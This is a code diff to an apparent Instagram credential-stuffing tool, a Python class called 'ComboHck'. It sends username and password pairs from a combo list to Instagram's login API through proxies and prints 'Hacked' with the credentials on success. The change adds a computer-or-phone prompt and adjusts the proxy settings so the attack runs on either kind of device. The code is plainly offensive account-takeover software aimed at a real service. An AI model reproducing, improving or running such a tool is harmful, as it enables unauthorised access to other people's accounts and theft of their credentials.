@@ -133,6 +133,9 @@ class ComboHck:
 		try:self.proxy =  open(self.pr,'r').read().splitlines()
 		except FileNotFoundError:
 			exit('\n[-] The file name is incorrect !\n')
+		self.msg = input("""[$] Do you use a computer or mobile phone?
+[1] - computer 
+[2] - mobile """)
 		print(' ')
 		self.Trts()
 	def Log_Combo(self):
@@ -168,7 +171,8 @@ class ComboHck:
 					'_csrftoken':'missing', 
 					'login_attempt_countn':'0'}
 				try:
-					PROXY = {"https://":run,"http://":run}
+					if self.msg == '1':PROXY = {"https://":run,"http://":run}
+					else:PROXY = {"https":run,"http":run}
 					get = sent.post('https://i.instagram.com/api/v1/accounts/login/', headers=headers, data=data, proxies=PROXY, allow_redirects=True)
 					if login in get.text:
 						print(grn+f'[+] Hacked >> {user}:{pess}')
